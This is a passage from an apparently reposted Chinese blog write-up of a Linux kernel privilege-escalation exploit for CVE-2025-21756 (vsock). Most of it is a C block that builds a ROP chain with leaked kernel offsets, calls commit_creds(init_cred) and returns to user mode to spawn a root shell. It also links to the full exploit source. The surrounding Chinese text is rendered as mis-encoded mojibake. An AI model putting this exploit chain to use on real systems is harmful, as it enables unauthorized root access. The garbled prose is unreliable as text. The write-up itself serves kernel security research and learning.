å¦ä¸€ä¸ªéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œéœ€è¦sk_lockä½¿ç”¨ä¸€äº›ç©ºå­—èŠ‚å’ŒæŒ‡é’ˆæ¥ä¼ªé€ æˆå‘˜ï¼ˆè¿™æ˜¯é€šè¿‡å¤§é‡è°ƒè¯•ç¡®å®šçš„ï¼‰ã€‚å¼„æ¸…æ¥šæ‰€æœ‰è¿™äº›ä¹‹åï¼Œæˆ‘æ„å»ºäº†ä»¥ä¸‹ ROP é“¾ã€‚  
  
```
long kern_base = base + off - 0x3bb1f80;printf("[*] leaked kernel base @ 0x%lx\n", kern_base);// calculate some rop gadgetslong raw_proto_abort = kern_base + 0x2efa8c0;long null_ptr = kern_base + 0x2eeaee0;long init_cred = kern_base + 0x2c74d80;long pop_r15_ret = kern_base + 0x15e93f;long push_rbx_pop_rsp_ret = kern_base + 0x6b9529;long pop_rdi_ret = kern_base + 0x15e940;long commit_creds = kern_base + 0x1fcc40;long ret = kern_base + 0x5d2;// info for returning to usermodelong user_cs = 0x33;long user_ss = 0x2b;long user_rflags = 0x202;long shell = (long)get_shell;uint64_t* user_rsp = (uint64_t*)get_user_rsp();// return to user modelong swapgs_restore_regs_and_return_to_usermode = kern_base + 0x16011a6;//getchar();printf("[+] writing the rop chain\n");close(pipes[i][0]);close(pipes[i][1]);if (pipe(&pipes[i][0])Â <Â 0) {Â  Â Â perror("pipe");}printf("[+]Â writingpayloadtovsk\n");write(pipes[i][1],Â page,Â w-56);charbuf[0x330];memset(buf, 'A',Â 0x330);charnot[0x330];memset(not,Â 0,Â 0x330);//Â createtheropchain!write(pipes[i][1], &pop_rdi_ret,Â 8); //Â stackpivottargetwrite(pipes[i][1], &init_cred,Â 8);write(pipes[i][1], &ret,Â 8);Â write(pipes[i][1], &ret,Â 8);write(pipes[i][1], &pop_r15_ret,Â 8); //Â junkwrite(pipes[i][1], &raw_proto_abort,Â 8); //Â sk_protÂ (callssk->sk_error_report())write(pipes[i][1], &ret, 8);write(pipes[i][1], &commit_creds, 8); // commit_creds(init_cred);write(pipes[i][1], &swapgs_restore_regs_and_return_to_usermode, 8);write(pipes[i][1], &null_ptr, 8); // raxwrite(pipes[i][1], &null_ptr, 8); // rdiwrite(pipes[i][1], &shell, 8); // ripwrite(pipes[i][1], &user_cs, 8);write(pipes[i][1], &user_rflags, 8);write(pipes[i][1], user_rsp, 8); // rspwrite(pipes[i][1], &user_ss, 8);write(pipes[i][1], buf, 0x18);write(pipes[i][1], &not, 8); // sk_lockwrite(pipes[i][1], &not, 8); // sk_lockwrite(pipes[i][1], &null_ptr, 8); // sk_lockwrite(pipes[i][1], &null_ptr, 8); // sk_lockwrite(pipes[i][1], buf, 0x200);write(pipes[i][1], &push_rbx_pop_rsp_ret, 8); // stack pivot [sk_error_report()]//getchar();close(s); // trigger the exploit!
```  
  
  
è¯·æ³¨æ„ï¼Œæˆ‘æ²¡æœ‰è°ƒç”¨è¯¥å‡½æ•°ï¼Œprepare_kernel_cred(NULL)å› ä¸ºå®ƒä¸å†å—æ”¯æŒï¼ˆä¼šå¯¼è‡´å´©æºƒï¼‰ã€‚ç›¸åï¼Œæˆ‘é€‰æ‹©è°ƒç”¨commit_credsä¸€ä¸ªç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å…·æœ‰ç›¸å¯¹äºå†…æ ¸åŸºå€çš„å¸¸é‡åç§»é‡ï¼Œå¹¶ä¸” uid=gid=0ã€‚æˆ‘è¿˜ä»è¿™ç¯‡init_credåšå®¢ä¸­å€Ÿç”¨äº† swapgs_restore_regs_and_return_to_usermode æŠ€æœ¯ã€‚æ‰€æœ‰è¿™äº›æ‹¼å›¾ç¢ç‰‡éƒ½åˆ°ä½åï¼Œæˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨å°±èƒ½è·å¾—ä¸€ä¸ª root shellï¼  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rWGOWg48tadaUxE9eycrpH9MyyWrS4apXooHbZQTFdHV32FqouHBTFRNjFsKN5z1jLqEfiaTw2jkOrtLNyuJaqg/640?wx_fmt=gif&from=appmsg "")  
  
è¯¥æ¼æ´çš„æœ€ç»ˆæºä»£ç å‘å¸ƒåœ¨è¿™é‡Œ  
https://github.com/hoefler02/CVE-2025-21756/blob/main/x.cã€‚è¯¥æ¼æ´è¿˜å¯ä»¥æ›´åŠ å¯é å’Œä¼˜é›…ï¼Œä½†ä½œä¸ºæˆ‘çš„ç¬¬ä¸€ä¸ªå†…æ ¸ç ´è§£è€…ï¼Œæˆ‘å·²ç»å¾ˆæ»¡æ„äº†ï¼  
  
è°¢è°¢ä½ ï¼  
  
å¯¹äºä¸€ä¸ªåªæ¶‰åŠå‡ è¡Œè¡¥ä¸ä»£ç çš„æ¼æ´æ¥è¯´ï¼Œè¿™æ®µæ—…ç¨‹è®©æˆ‘å¯¹å†…æ ¸çš„äº†è§£è¿œè¶…é¢„æœŸï¼å¦‚æœæ²¡æœ‰[#kernelctf]()  
Â discord é¢‘é“ä¸Šæ‰€æœ‰è¶…çº§å¥½å¿ƒçš„é»‘å®¢ä»¬çš„å¸®åŠ©ï¼Œæˆ‘æ°¸è¿œä¹Ÿå®Œæˆä¸äº†è¿™æ¬¡æ¼æ´åˆ©ç”¨ï¼è°¢è°¢å¤§å®¶ï¼ç¥ä½ ç ´è§£æ„‰å¿«ï¼  
  
  
  
æ„Ÿè°¢æ‚¨æŠ½å‡º  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
æ¥é˜…è¯»æœ¬æ–‡  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**ç‚¹å®ƒï¼Œåˆ†äº«ç‚¹èµåœ¨çœ‹éƒ½åœ¨è¿™é‡Œ**  
  
  
  
